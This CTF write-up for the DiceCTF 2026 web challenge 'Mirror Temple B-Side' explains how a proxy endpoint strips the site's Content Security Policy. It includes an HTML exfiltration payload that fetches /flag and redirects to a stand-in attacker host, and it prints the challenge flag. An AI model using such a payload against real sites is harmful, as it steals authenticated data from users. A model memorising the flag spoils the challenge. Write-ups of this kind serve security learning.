# DiceCTF 2026 — Mirror Temple B-Side

## Information
- **CTF**: DiceCTF 2026
- **Challenge**: Mirror Temple B-Side
- **Category**: Web
- **Difficulty**: Medium
- **Date**: 2026-03-07
- **Flag**: `dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_42_rof_ekawa_neeb_evah_i_tcaf_nuf}`
- **Related**: Mirror Temple (original) — same exploit works

## Description
Hardened version of Mirror Temple with stricter CSP (sha384 hashes instead of `script-src *`, `frame-src/frame-ancestors 'none'`). However, the core vulnerability — Charon proxy overwriting SecurityTMFilter headers — remains unfixed.

---

## Solution

### Step 1: Diff against original Mirror Temple

Only `SecurityTM.kt` has meaningful changes:

| Directive | Original | B-Side |
|-----------|----------|--------|
| `script-src` | `*` (any origin) | 3 specific `sha384-` hashes |
| `style-src` | `'self'` + google fonts | 2 `sha384-` hashes + google fonts |
| `frame-src` | `'self'` | `'none'` |
| `frame-ancestors` | `'self'` | `'none'` |

CSS files moved inline (with SRI hashes). Scripts have `integrity` attributes.

CorsProxy.kt, MirrorTemple.kt, SaveFile.kt, admin.mjs, index.js — all **identical** to original.

### Step 2: Verify that the proxy vulnerability persists

The Charon proxy still overwrites ALL SecurityTMFilter headers. Content served via `/proxy?url=` has **no CSP** regardless of how strict the configured CSP is.

```bash
# B-Side proxy response — NO CSP header
curl -s "https://mirror-temple-b-side.ctfi.ng/proxy?url=http://example.com" -b cookies.txt -D - | grep Content-Security
# (empty)
```

### Step 3: Identical exploit to the original

Same attack chain as Mirror Temple:

1. Host `evil.html` on attacker server with inline `<script>` that fetches `/flag` and exfiltrates
2. Submit report with URL: `http://localhost:8080/proxy?url=http://ATTACKER/evil.html`
3. Admin bot navigates to proxy URL → no CSP → JS executes → flag stolen

```html
<!DOCTYPE html>
<html><body>
<script>
(async()=>{
const r=await fetch('/flag');
const f=await r.text();
window.location='http://ATTACKER:PORT/collect?flag='+encodeURIComponent(f);
})();
</script>
</body></html>
```

---

## Flag
```
dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_42_rof_ekawa_neeb_evah_i_tcaf_nuf}
```

---

